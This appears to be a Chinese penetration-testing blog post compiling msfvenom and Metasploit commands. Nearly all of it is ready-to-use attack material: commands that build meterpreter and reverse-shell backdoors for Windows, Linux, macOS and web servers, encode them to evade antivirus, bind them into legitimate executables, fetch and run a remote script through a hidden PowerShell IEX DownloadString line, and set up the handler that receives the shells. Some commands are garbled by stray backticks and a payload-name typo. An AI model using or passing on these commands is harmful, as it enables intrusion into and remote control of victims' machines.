---
title: msfvenon使用整理
date: 2022/1/2
categories: 渗透测试
tags: [渗透测试,msf]
top_img: https://herozql.oss-cn-beijing.aliyuncs.com/bg_pic/bing_24.jpg
cover: https://herozql.oss-cn-beijing.aliyuncs.com/bg_pic/bing_24.jpg
---

- [参考链接1](https://www.cnblogs.com/BOHB-yunying/p/11628896.html)
- [参考链接2](https://blog.csdn.net/qq_37964989/article/details/102582244)

## msfvenon生成木马文件：

>格式：msfvenom -p <payload> <payload options> -a <arch> --platform <platform> -e <encoder option> -i <encoder times> -b <bad-chars> -n <nopsled> -f <format> -o <path>
>          // -e 常用编码    x86/shikata_ga_nai      cmd/powershell_base64
>         // -f指指定的可执行文件类型   -o 指定输出地址。

## msfvenom参数解析

>## 1.  –p (- -payload-options)
>
>添加载荷payload。
>
>载荷这个东西比较多，这个软件就是根据对应的载荷payload生成对应平台下的后门，所以只有选对payload，再填写正确自己的IP，PORT就可以生成对应语言，对应平台的后门了！！！
>
>(- -payload-options 列出payload选项)
>
>## **2.  –l**
>
>查看所有payload encoder nops。
>
>## **3.  –f （- -help-formats）**
>
>输出文件格式。
>
>(- -help-formats 列出所有文件格式)
>
>Executable formats:
>
>asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war
>
>Transform formats:
>
>bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
>
>## **4.  –e**
>
>编码免杀。
>
>## **5.  –a (- -platform – -help-platforms)**
>
>选择架构平台
>
>x86 | x64 | x86_64
>
>**Platforms:**
>
>**windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe**
>
>## **6.  –o**
>
>文件输出。
>
>## **7.  –s**
>
>生成payload的最大长度，就是文件大小。
>
>## **8.  –b**
>
>避免使用的字符 例如：不使用 ‘0f’。
>
>## **9.  –i**
>
>编码次数。
>
>## **10.     –c**
>
>添加自己的shellcode。
>
>## **11.     –x | -k**
>
>捆绑。例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。

## 用法示例：

>1. msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<本机ip地址> lport=<本机监听端口> -f psh-reflection  -o xx.ps1   //生成文件放在目标机目录下
>     //powershell执行脚本：powershell -windowstyle hidden -exec bypass IEX (New-Object  Net.WebClient).DownloadString('http://<yourip>/xxx.ps1');xxx.ps1
>2. use exploit/multi/handler
>3. set payload windows/x64/meterpreter/reverse_tcp
>4. show options
>5. set LHOST=XXX    RHOST=XXX
>6. run
>7. 目标主机执行木马文件



## 反向连接：

- linux:

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<本机ip地址> LPORT=<本机监听端口> -f psh-reflection  -o xx.ps1
```

- windows:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<本机ip地址> LPORT=<本机监听端口> -f psh-reflection  -o xx.ps1
//生成64位系统木马：
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<本机ip地址> lport=<本机监听端口> -f psh-reflection  -o xx.ps1
```



## 正向连接：

- linux:

```
msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=<本机ip地址> LPORT=<本机监听端口> -f psh-reflection  -o xx.ps1
```

- windows:

```
msfvenom -p windows/meterpreter/bind_tcp LHOST=<本机ip地址> LPORT=<本机监听端口> -f psh-reflection  -o xx.ps1
```



## 启用exploit/multi/handler模块：

```
use exploit/multi/handler 
```



## 设置PAYLOAD：
- linux：

```
linux/x86/meterpreter/reverse_tcp  //反向payload
linux/x86/meterpreter/bind_tcp       //正向payload
linux/x86/shell_bind_tcp
linux/x86/shell_reverse_tcp
linux/x64/shell_reverse_tcp
linux/x64/shell_bind_tcp
```

- windows:

```
windows/meterpreter/reverse_tcp    //反向payload
windows/meterpreter/bind_tcp         //正向payload
windows/shell_reverse_tcp
windows/shell_bind_tcp
windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter/bind_tcp
windows/x64/shell_reverse_tcp
windows/x64/shell_bind_tcp
```



## 设置参数运行
```
set  .....

run
```



## 添加路由
```
route add <目标IP> <目标子网掩码>

示例：route add 10.0.0.1 255.0.0.0 1       //最后的1为添加该路由到session 1
```

## 更多实例

- 普通生成

```
msfvenom -p <payload> <payload options> -f <format> -o <path>
msfvenom –p windows/meterpreter/reverse_tcp –f exe –o C:back.exe
```

- 编码处理型

```
msfvenom -p <payload> -e <encoder > -i <encoder times> -n <nopsled> -f <format> -o <path>
msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:back.exe
```

- 捆绑

```
msfvenom –p windows `/meterpreter/reverse_tcp` –platform windows –a x86 –x C:nomal.exe –k –f exe –o C:shell.exe
```

- Windows

```
msfvenom –platform windows –a x86 –p windows``/meterpreter/reverse_tcp` `–i 3 –e x86``/shikata_ga_nai` `–f exe –o C:back.exe``Msfvenom –platform windows –a x86 –p windows``/x64/meterpreter/reverse_tcp` `–f exe –o C:back.exe
```

- Linux　　

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```

- MAC

```
msfvenom -p osx``/x86/shell_reverse_tcp` `LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
```

- PHP　

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
```

- Asp

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f aspx > shell.asp
```

- Aspx

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f aspx > shell.aspx
```

- JSP

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
```

- War

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

- Bash

```
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On>-f raw > shell.sh
```

- perl

```
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```

- Python

```
msfvenom -p python/meterpreter/reverser_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
```



## 参数一览

```
-l, --list           <type>              列出指定类型的所有模块 类型包括: payloads, encoders, nops, platforms, archs, formats, all

-p, --payload   <payload>       指定需要使用的payload(有效载荷)(--list payloads得到payload列表,--list-options得到指定payload的参数)                                                    如果需要使用自定义的payload,请使用'-'或者stdin指定
      --list-options                     列出指定payload的标准,高级和规避选项  例如:msfvenom -p generic/shell_bind_tcp --list-options                                                                 将列出shell_bind_tcp这个payload的各种选项信息

-f, --format        <format>        指定输出格式(使用 --list formats 列出所有的格式)

-e, --encoding   <encoder>     要使用的编码(使用 --list encoders 列出所有的编码) 用于编码加密
     --smallest                           使用所有可用的编码器生成尽可能小的有效负载

-a, --arch          <arch>            指定payload的目标CPU架构(使用 --list archs 列出所有的CPU架构)
     --platform    <platform>      指定payload的目标操作系统平台(使用 --list platforms 列出所有的操作系统平台)

-o, --out            <path>            将payload保存到文件中

-b, --bad-chars  <list>             指定不使用的字符集 例如:不使用'x00xff'这两个字符

-n, --nopsled     <length>        在payload上添加指定长度的nop指令

-s, --space        <length>        设定payload的最大长度    即生成的文件大小
     --encoder-space <length> 设定编码payload的最大长度(默认为-s的值)

-i, --iterations     <count>         对payload进行编码的次数

-c, --add-code    <path>           指定一个自己的win32 shellcode文件 

-x, --template      <path>          指定一个可执行程序 将payload捆绑其中 
                                                 例如:原先有个正常文件normal.exe 通过此选项把payload捆绑到这个程序上面

-k, --keep                                  针对-x中的捆绑程序 将创建新线程执行payload 一般情况-x -k选项一起使用

-v, --var-name     <value>         指定用于某些输出格式的自定义变量名称

-t, --timeout         <second>      从STDIN读取有效负载时等待的秒数(默认为30, 0为禁用)

-h, --help                                    查看帮助
```

